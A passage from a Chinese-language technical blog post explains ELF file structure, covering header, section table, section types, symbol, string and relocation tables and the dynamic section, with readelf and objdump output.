color="navy">0x02.ELF文件的结构</font></h2><h3 id="1-ELF的头部（52个字节）"><a href="#1-ELF的头部（52个字节）" class="headerlink" title="1.ELF的头部（52个字节）"></a>1.ELF的头部（52个字节）</h3><p>首先来看elf.h文件中ELF头部的结构体 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];     <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half    e_type;                 <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half    e_machine;              <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word    e_version;              <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr    e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off     e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off     e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word    e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half    e_ehsize;               <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half    e_phentsize;            <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half    e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half    e_shentsize;            <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half    e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half    e_shstrndx;             <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>其中，e_ident数组给出了ELF的一些标识信息，这个数组中不同下标的含义如表所示：</p><p><img src="/images/150-4.png" alt></p><p>&gt;</p><blockquote><p>从上面的结构体可以看出，ELF头部的大小为<code>16+2+2+4+4+4+4+4+2+2+2+2+2+2</code> = <code>52</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -h <span class="built_in">test</span></span></span><br></pre></td></tr></table></figure><blockquote><p>得到如下的结果c</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ELF Header:</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">| Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 |</span><br><span class="line">| Class:                             ELF32|</span><br><span class="line">| Data:                              2&apos;s complement, little endian|</span><br><span class="line">| Version:                           1 (current)|</span><br><span class="line">| OS/ABI:                            UNIX - System V|</span><br><span class="line">| ABI Version:                       0|</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">  Type:                              DYN (Shared object file)              </span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x1070</span><br><span class="line">  Start of program headers:          52 (bytes into file)</span><br><span class="line">  Start of section headers:          14384 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         11</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         30</span><br><span class="line">  Section header string table index: 29</span><br></pre></td></tr></table></figure><blockquote><p>可以从上面得到如下信息：</p><ul><li>程序入口的地址</li><li>程序头的偏移</li><li>段表头的偏移：里面包含各个段的大小、偏移和其他相关信息</li><li>段表的数量：通过段表头的偏移+每段固定的大小+段表的数量，就可以确定section的大小范围</li></ul></blockquote><p>上述实例代码中的头部信息为：</p><p><img src="/images/150-3.png" alt></p><h3 id="2-ELF的程序头"><a href="#2-ELF的程序头" class="headerlink" title="2.ELF的程序头"></a>2.ELF的程序头</h3><blockquote><p>程序头部表（Program Header Table），如果存在的话，则是告诉系统如何创建进程映像。用来构造进程映像的目标文件必须具有程序头部表，可重定位文件不需要这个表。</p></blockquote><font size="2">通过ELF的文件头可以看出，文中实例的程序头位于ELF文件的`52`字节的偏移处</font><h3 id="3-ELF的段表"><a href="#3-ELF的段表" class="headerlink" title="3.ELF的段表"></a>3.ELF的段表</h3><p>ELF的段表结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Section header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    sh_name;                <span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Word    sh_type;                <span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Word    sh_flags;               <span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addr    sh_addr;                <span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Off     sh_offset;              <span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Word    sh_size;                <span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Word    sh_link;                <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word    sh_info;                <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word    sh_addralign;           <span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Word    sh_entsize;             <span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><blockquote><p>可以看出段表的每一个段的信息大小都是固定的<code>10*4=40</code>个字节，用<code>readelf -S test</code>，查看实例中的ELF文件的段表，如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">There are 30 section headers, starting at offset 0x3830:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        00000194 000194 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.gnu.bu[...] NOTE            000001a8 0001a8 000024 00   A  0   0  4</span><br><span class="line">  [ 3] .note.ABI-tag     NOTE            000001cc 0001cc 000020 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        000001ec 0001ec 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          0000020c 00020c 000090 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0000029c 00029c 0000b6 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          00000352 000352 000012 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         00000364 000364 000040 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             000003a4 0003a4 000040 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             000003e4 0003e4 000018 08  AI  5  23  4</span><br><span class="line">  [11] .init             PROGBITS        00001000 001000 000020 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        00001020 001020 000040 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        00001060 001060 000008 08  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        00001070 001070 000275 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        000012e8 0012e8 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        00002000 002000 00007b 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        0000207c 00207c 000054 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        000020d0 0020d0 000160 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      00003ef4 002ef4 000004 04  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      00003ef8 002ef8 000004 04  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         00003efc 002efc 0000f0 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        00003fec 002fec 000014 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        00004000 003000 000018 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        00004018 003018 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          00004020 003020 000004 00  WA  0   0  1</span><br><span class="line">  [26] .comment          PROGBITS        00000000 003020 00001e 01  MS  0   0  1</span><br><span class="line">  [27] .symtab           SYMTAB          00000000 003040 000470 10     28  45  4</span><br><span class="line">  [28] .strtab           STRTAB          00000000 0034b0 00027a 00      0   0  1</span><br><span class="line">  [29] .shstrtab         STRTAB          00000000 00372a 000105 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure><blockquote><p>一共有30个段，验证了ELF文件头的<code>Number of section headers: 30</code>，那么整个段表的大小就是：段的个数*每个段信息的固定大小，该实例中段表的大小为：<code>30\*40=1200</code>。</p></blockquote><p><img src="/images/150-6.png" alt></p><p>ELF文件结构示意图中定义的<code>Elf_Shdr</code>的各个成员的含义与readelf具有对应关系。如下表所示：</p><div class="table-container"><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>sh_name</td><td>节名<br><font size="2" color="navy">节名是一个字符串，保存在一个名为<code>.shstrtab</code>的字符串表（可通过Section Header索引到）。<br>sh_name的值实际上是其节名字符串在<code>.shstrtab</code>中的偏移值</font></td></tr><tr><td>sh_type</td><td>节类型</td></tr><tr><td>sh_flags</td><td>节标志位</td></tr><tr><td>sh_addr</td><td>节地址：节的虚拟地址<br><font size="2" color="navy">如果该节可以被加载，则sh_addr为该节被加载后在进程地址空间中的虚拟地址；否则sh_addr为0</font></td></tr><tr><td>sh_offset</td><td>节偏移<br><font size="2" color="navy"><strong>如果该节存在于文件中，则表示该节在文件中的偏移；否则无意义，如sh_offset对于BSS 节来说是没有意义的</strong></font></td></tr><tr><td>sh_size</td><td>节大小</td></tr><tr><td>sh_link、sh_info</td><td>节链接信息</td></tr><tr><td>sh_addralign</td><td>节地址对齐方式</td></tr><tr><td>sh_entsize</td><td>节项大小<br><font size="2" color="navy">有些节包含了一些固定大小的项，如符号表，其包含的每个符号所在的大小都一样的，对于这种节，sh_entsize表示每个项的大小。<br><strong>如果为0，则表示该节不包含固定大小的项。</strong></font></td></tr></tbody></table></div><h4 id="①-节类型（sh-type）"><a href="#①-节类型（sh-type）" class="headerlink" title="① 节类型（sh_type）"></a>① 节类型（sh_type）</h4><blockquote><p>节名是一个字符串，只是在链接和编译过程中有意义，但它并不能真正地表示节的类型。对于编译器和链接器来说，主要决定节的属性是节的类型（<code>sh_type</code>）和节的标志位（<code>sh_flags</code>）。</p></blockquote><p>节的类型相关常量以<code>SHT_</code>开头，上述<code>readelf -S</code>命令执行的结果省略了该前缀。常见的节类型如下表所示：</p><div class="table-container"><table><thead><tr><th>常量</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td>SHT_NULL</td><td>0</td><td>无效节</td></tr><tr><td>SHT_PROGBITS</td><td>1</td><td><strong>程序节</strong>。代码节、数据节都是这种类型。</td></tr><tr><td><strong>SHT_SYMTAB</strong></td><td>2</td><td><strong>符号表</strong></td></tr><tr><td><strong>SHT_STRTAB</strong></td><td>3</td><td><strong>字符串表</strong></td></tr><tr><td>SHT_RELA</td><td>4</td><td><strong>重定位表</strong>。该节包含了重定位信息</td></tr><tr><td>SHT_HASH</td><td>5</td><td><strong>符号表的哈希表</strong></td></tr><tr><td>SHT_DYNAMIC</td><td>6</td><td>动态链接信息</td></tr><tr><td>SHT_NOTE</td><td>7</td><td>提示性信息</td></tr><tr><td>SHT_NOBITS</td><td>8</td><td>表示该节在文件中没有内容。如<code>.bss</code>节</td></tr><tr><td>SHT_REL</td><td>9</td><td>该节包含了重定位信息</td></tr><tr><td>SHT_SHLIB</td><td>10</td><td>保留</td></tr><tr><td>SHT_DNYSYM</td><td>11</td><td><strong>动态链接的符号表</strong></td></tr></tbody></table></div><h4 id="②-节标志位（sh-flag）"><a href="#②-节标志位（sh-flag）" class="headerlink" title="② 节标志位（sh_flag）"></a>② 节标志位（sh_flag）</h4><p>节标志位表示该节在进程虚拟地址空间中的属性。如是否可写、是否可执行等。相关常量以<code>SHF_</code>开头。常见的节标志位如下表所示：</p><div class="table-container"><table><thead><tr><th>常量</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td>SHF_WRITE</td><td>1</td><td>表示该节在进程空间中可写</td></tr><tr><td>SHF_ALLOC</td><td>2</td><td>表示该节在进程空间中需要分配空间。<br>有些包含指示或控制信息的节不需要在进程空间中分配空间，就不会有这个标志。</td></tr><tr><td>SHF_EXECINSTR</td><td>4</td><td>表示该节在进程空间中可以被执行</td></tr></tbody></table></div><h3 id="4-节的分类"><a href="#4-节的分类" class="headerlink" title="4.节的分类"></a>4.节的分类</h3><p>上述ELF Section Header Table部分已经简单介绍了节类型。接下来我们来介绍详细一些比较重要的节。</p><h4 id="①-text节"><a href="#①-text节" class="headerlink" title="① .text节"></a>① .text节</h4><p><code>.text</code>节是保存了程序代码指令的<strong>代码节</strong>。<strong>一段可执行程序，如果存在Phdr，则<code>.text</code>节就会存在于<code>text</code>段中</strong>。由于<code>.text</code>节保存了程序代码，所以节类型为<code>SHT_PROGBITS</code>。</p><p><img src="/images/150-7.png" alt></p><h4 id="②-rodata节"><a href="#②-rodata节" class="headerlink" title="② .rodata节"></a>② .rodata节</h4><p><code>rodata</code>节保存了只读的数据，如一行C语言代码中的字符串。由于<code>.rodata</code>节是只读的，所以只能存在于一个可执行文件的<strong>只读段</strong>中。因此，只能在<code>text</code>段（不是<code>data</code>段）中找到<code>.rodata</code>节。由于<code>.rodata</code>节是只读的，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="③-plt节（过程链接表）"><a href="#③-plt节（过程链接表）" class="headerlink" title="③ .plt节（过程链接表）"></a>③ .plt节（过程链接表）</h4><p><code>.plt</code>节也称为<strong>过程链接表（Procedure Linkage Table）</strong>，<strong>其包含了动态链接器调用从共享库导入的函数所必需的相关代码</strong>。由于<code>.plt</code>节保存了代码，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="④-data节"><a href="#④-data节" class="headerlink" title="④ .data节"></a>④ .data节</h4><p><code>.data</code>节存在于<code>data</code>段中，<strong>其保存了初始化的全局变量等数据</strong>。由于<code>.data</code>节保存了程序的变量数据，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="⑤-bss节"><a href="#⑤-bss节" class="headerlink" title="⑤ .bss节"></a>⑤ .bss节</h4><p><code>.bss</code>节存在于<code>data</code>段中，占用空间不超过4字节，仅表示这个节本省的空间。<strong><code>.bss</code>节保存了未进行初始化的全局数据</strong>。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于<code>.bss</code>节未保存实际的数据，所以节类型为<code>SHT_NOBITS</code>。</p><h4 id="⑥-got-plt节（全局偏移表-过程链接表）"><a href="#⑥-got-plt节（全局偏移表-过程链接表）" class="headerlink" title="⑥ .got.plt节（全局偏移表-过程链接表）"></a>⑥ .got.plt节（全局偏移表-过程链接表）</h4><p><code>.got</code>节保存了<strong>全局偏移表</strong>。<strong><code>.got</code>节和<code>.plt</code>节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改</strong>。由于<code>.got.plt</code>节与程序执行有关，所以节类型为<code>SHT_PROGBITS</code>。</p><h4 id="⑦-dynsym节（动态链接符号表）"><a href="#⑦-dynsym节（动态链接符号表）" class="headerlink" title="⑦ .dynsym节（动态链接符号表）"></a>⑦ .dynsym节（动态链接符号表）</h4><p><code>.dynsym</code>节保存在<code>text</code>段中。<strong>其保存了从共享库导入的动态符号表</strong>。节类型为<code>SHT_DYNSYM</code>。</p><h4 id="⑧-dynstr节（动态链接字符串表）"><a href="#⑧-dynstr节（动态链接字符串表）" class="headerlink" title="⑧ .dynstr节（动态链接字符串表）"></a>⑧ .dynstr节（动态链接字符串表）</h4><p><code>.dynstr</code>保存了动态链接字符串表，表中存放了一系列字符串，这些字符串代表了符号名称，以空字符作为终止符。</p><h4 id="⑨-rel-节（重定位表）"><a href="#⑨-rel-节（重定位表）" class="headerlink" title="⑨ .rel.*节（重定位表）"></a>⑨ .rel.*节（重定位表）</h4><p>重定位表保存了重定位相关的信息，<strong>这些信息描述了如何在链接或运行时，对ELF目标文件的某部分或者进程镜像进行补充或修改</strong>。由于重定位表保存了重定位相关的数据，所以节类型为<code>SHT_REL</code>。</p><h4 id="⑩-hash节"><a href="#⑩-hash节" class="headerlink" title="⑩ .hash节"></a>⑩ .hash节</h4><p><code>.hash</code>节也称为<code>.gnu.hash</code>，其保存了一个用于查找符号的散列表。</p><h4 id="⑪-symtab节（符号表）"><a href="#⑪-symtab节（符号表）" class="headerlink" title="⑪ .symtab节（符号表）"></a>⑪ .symtab节（符号表）</h4><p><code>.symtab</code>节是一个<code>ElfN_Sym</code>的数组，保存了符号信息。节类型为<code>SHT_SYMTAB</code>。</p><p><img src="/images/150-5.png" alt></p><blockquote><p>上图所示为通过符号表索引字符串表的示意图。符号表中的每一项都是一个<code>Elf_Sym</code>结构，对应可以在字符串表中索引得到一个字符串。该数据结构中成员的含义如下表所示：</p></blockquote><div class="table-container"><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>st_name</td><td>符号名。该值为该符号名在字符串表中的偏移地址。</td></tr><tr><td>st_value</td><td>符号对应的值。存放符号的值（可能是地址或位置偏移量）。</td></tr><tr><td>st_size</td><td>符号的大小</td></tr><tr><td>st_other</td><td>0</td></tr><tr><td>st_shndx</td><td>符号所在的节</td></tr><tr><td>st_info</td><td>符号类型及绑定属性</td></tr></tbody></table></div><h4 id="⑫-strtab节（字符串表）"><a href="#⑫-strtab节（字符串表）" class="headerlink" title="⑫ .strtab节（字符串表）"></a>⑫ .strtab节（字符串表）</h4><p><code>.strtab</code>节保存的是符号字符串表，表中的内容会被<code>.symtab</code>的<code>ElfN_Sym</code>结构中的<code>st_name</code>引用。节类型为<code>SHT_STRTAB</code>。</p><blockquote><p>类似于符号表，在大多数共享库和动态链接可执行文件中，也存在两个字符串表。即<code>.dynstr</code>和<code>.strtab</code>，分别对应于<code>.dynsym</code>和<code>symtab</code>。此外，还有一个<code>.shstrtab</code>的节头字符串表，用于保存节头表中用到的字符串，可通过<code>sh_name</code>进行索引。</p><p>ELF文件中所有字符表的结构基本一致，如上图所示。</p></blockquote><p>Elf文件中用到的字符串，如段名、函数名、变量名称等，均保存在字符串表中。其中，shstrtab段表字符串表仅用来保存段名，而strtab或dynstr section则是存放普通字符串，如函数、变量名等符号名称，字符串之间以”00”截断。</p><h4 id="⑬-ctors节和-dtors节"><a href="#⑬-ctors节和-dtors节" class="headerlink" title="⑬ .ctors节和.dtors节"></a>⑬ .ctors节和.dtors节</h4><p><code>.ctors</code>（<strong>构造器</strong>）节和<code>.dtors</code>（<strong>析构器</strong>）节分别保存了指向构造函数和析构函数的函数指针，<strong>构造函数是在main函数执行之前需要执行的代码；析构函数是在main函数之后需要执行的代码</strong>。</p><h4 id="⑭-自定义section"><a href="#⑭-自定义section" class="headerlink" title="⑭ 自定义section"></a>⑭ 自定义section</h4><p>在声明一个函数或变量时，可以加上<strong>attribute</strong>((section(“自定义section名”)))前缀的方式，将其添加到自定义段。</p><h3 id="5-ELF（动态）符号-字符串表的联系和区别"><a href="#5-ELF（动态）符号-字符串表的联系和区别" class="headerlink" title="5.ELF（动态）符号/字符串表的联系和区别"></a>5.ELF（动态）符号/字符串表的联系和区别</h3><div class="table-container"><table><thead><tr><th>名称</th><th>作用</th><th>name的值</th></tr></thead><tbody><tr><td>.dynsym</td><td><strong>其保存了从共享库导入的动态符号表</strong>。<br>节类型为<code>SHT_DYNSYM</code>。</td><td>对应.dystr中的偏移</td></tr><tr><td>.symtab</td><td>是一个<code>ElfN_Sym</code>的数组，保存了符号信息。<br>节类型为<code>SHT_SYMTAB</code>。</td><td>对应.strtab中的偏移</td></tr><tr><td>.dystr</td><td>对应于<code>.dynsym</code></td><td>无</td></tr><tr><td>.strtab</td><td>对应于<code>.symtab</code></td><td>无</td></tr><tr><td>.shstrtab</td><td>用于保存<strong>节头表中</strong>用到的字符串，可通过<code>sh_name</code>进行索引。</td><td>无</td></tr></tbody></table></div><h4 id="①-符号表结构"><a href="#①-符号表结构" class="headerlink" title="① 符号表结构"></a>① 符号表结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;               <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;               <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section st_shndx;               <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><h3 id="6-重定位表"><a href="#6-重定位表" class="headerlink" title="6.重定位表"></a>6.重定位表</h3><blockquote><p><strong>重定位就是将符号定义和符号引用进行连接的过程</strong>。可重定位文件需要包含描述如何修改节内容的相关信息，从而使可执行文件和共享目标文件能够保存进程的程序镜像所需要的正确信息。</p></blockquote><p>重定位表是进行重定位的重要依据。我们可以使用objdump工具查看目标文件的重定位表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -r hello.o</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hello.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.text]:</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000000005 R_X86_64_32       .rodata</span><br><span class="line">000000000000000a R_X86_64_PC32     puts-0x0000000000000004</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.eh_frame]:</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000000020 R_X86_64_PC32     .text</span><br></pre></td></tr></table></figure><p>重定位表是一个<code>Elf_Rel</code>类型的数组结构，每一项对应一个需要进行重定位的项。<br>其成员含义如下表所示：</p><div class="table-container"><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>r_offset</td><td>▨ 重定位入口的偏移。<br>▨ 对于<strong>可重定位文件</strong>来说，这个值是该重定位入口所要修正的位置的第一个字节相对于节起始的偏移<br>▨ 对于<strong>可执行文件或共享对象文件</strong>来说，这个值是该重定位入口所要修正的位置的第一个字节的虚拟地址</td></tr><tr><td>r_info</td><td>▨ 重定位入口的类型和符号<br>▨ 因为不同处理器的指令系统不一样，所以重定位所要修正的指令地址格式也不一样。<br>    每种处理器都有自己的一套重定位入口的类型。<br>▨ 对于<strong>可执行文件和共享目标文件</strong>来说，它们的重定位入口是动态链接类型的。</td></tr></tbody></table></div><p>重定位是目标文件链接成为可执行文件的关键。我们将在后面的进行介绍。</p><h3 id="7-与动态链接相关的段表"><a href="#7-与动态链接相关的段表" class="headerlink" title="7.与动态链接相关的段表"></a>7.与动态链接相关的段表</h3><h4 id="①-dynamic"><a href="#①-dynamic" class="headerlink" title="① .dynamic"></a>① .dynamic</h4><blockquote><p>该段保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword   d_tag;                  <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf32_Word d_val;                 <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;                 <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword  d_tag;                  <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;                <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;                 <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>d_tag 类型</th><th>d_un 的含义</th></tr></thead><tbody><tr><td>DT_SYMTAB</td><td>动态链接符号表的地址，d_ptr 表示 “.dynsym” 的地址</td></tr><tr><td>DT_STRTAB</td><td>动态链接字符串表的地址，d_ptr 表示 “.dynstr” 的地址</td></tr><tr><td>DT_STRSZ</td><td>动态链接字符串表大小，d_val 表示大小</td></tr><tr><td>DT_HASH</td><td>动态链接哈希表地址， d_ptr 表示 “.hash” 的地址</td></tr><tr><td>DT_SONAME</td><td>本共享对象的 